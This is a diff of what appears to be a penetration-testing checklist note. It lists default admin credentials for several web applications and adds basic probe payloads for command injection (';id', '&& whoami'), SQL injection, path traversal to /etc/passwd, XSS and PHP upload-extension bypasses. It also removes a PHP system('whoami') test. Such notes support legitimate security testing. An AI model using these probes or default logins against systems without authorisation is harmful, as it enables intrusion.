@@ -98,8 +98,6 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 ---
 
-
-
 If admin login page is found,
 
 Google for default credentials
@@ -109,6 +107,10 @@ Google for default credentials
 | Dolibarr        | 17.0.0           | Admin | admin    | admin    |
 | Jetty           | 9.4.39.v20210325 | Admin | admin    | admin    |
 | Request Tracker | 4.4.4            | root  | root     | password |
+
+---
+
+Test parameters (?id=1, ?page=)
 
 ---
 
@@ -184,24 +186,38 @@ Examples :
 
 ---
 
-Look for php code inclusion
-
-Templates
-Pages
-
-Test for php execution
-```
-<?PHP echo system("whoami");?>
-```
-
----
-
-Testing for SQL Injection
+### 1. Command Injection
 
 ```
-test' or 1=1;-- - 
+;id
 ```
 
+```
+&& whoami
+```
+### 2. SQL Injection
+
+```
+test'
+```
+
+```
+1=1;-- -
+```
+### 3. File Inclusion
+
+```
+?page=../../../../etc/passwd
+```
+### 4. XSS
+
+<script>alert(1)</script>
+### 5. File upload abuse
+
+- Upload `.php`
+- Try bypass:
+    - `.php.jpg`
+    - `.phtml`
 
 ---
 
